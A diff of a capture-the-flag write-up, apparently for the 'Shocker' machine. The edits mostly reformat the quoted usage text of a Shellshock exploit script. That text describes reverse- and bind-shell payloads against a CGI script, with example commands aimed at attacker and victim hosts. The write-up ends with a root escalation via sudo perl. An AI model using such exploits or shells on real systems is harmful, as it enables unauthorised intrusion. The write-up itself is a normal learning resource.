@@ -19,7 +19,7 @@ Let's futher bruteforce it to see if we have any scripts in there.
 We found a script `user.sh` in `/cgi-bin/` directory
 
 Requesting this in burp
-![](./images/shocker_gobuster2.png)
+![](./images/shocker_burp.png)
 
 It seems like an output for a script, so we might have a shellshock vulnerability.
 
@@ -43,24 +43,24 @@ Lets  try it
 Here is the usage
 ```python
 Usage:                                                                                                  
- 16 ./exploit.py var=<value>                                                                                
- 17                                                                                                         
- 18 Vars:                                                                                                   
- 19 rhost: victim host                                                                                      
- 20 rport: victim port for TCP shell binding                                                                
- 21 lhost: attacker host for TCP shell reversing                                                            
- 22 lport: attacker port for TCP shell reversing                                                            
- 23 pages:  specific cgi vulnerable pages (separated by comma)                                              
- 24 proxy: host:port proxy                                                                                  
- 25                                                                                                         
- 26 Payloads:                                                                                               
- 27 "reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)                             
- 28 "bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)                                    
- 29                                                                                                         
- 30 Example:                                                                                                
- 31                                                                                                         
- 32 ./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234                                     
- 33 ./exploit.py payload=bind rhost=1.2.3.4 rport=1234    
+./exploit.py var=<value>                                                                                
+                                                                                                        
+Vars:                                                                                                   
+rhost: victim host                                                                                      
+rport: victim port for TCP shell binding                                                                
+lhost: attacker host for TCP shell reversing                                                            
+lport: attacker port for TCP shell reversing                                                            
+pages:  specific cgi vulnerable pages (separated by comma)                                              
+proxy: host:port proxy                                                                                  
+                                                                                                        
+Payloads:                                                                                               
+"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)                             
+"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)                                    
+                                                                                                        
+Example:                                                                                                
+                                                                                                        
+./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234                                     
+./exploit.py payload=bind rhost=1.2.3.4 rport=1234    
  ```
  
  lets fire the script
@@ -94,6 +94,3 @@ Below i try with sudo precedding the full path of perl as mentioned in `sudo -l`
 
 Now we have root. Cheers!
 
-
-
-```
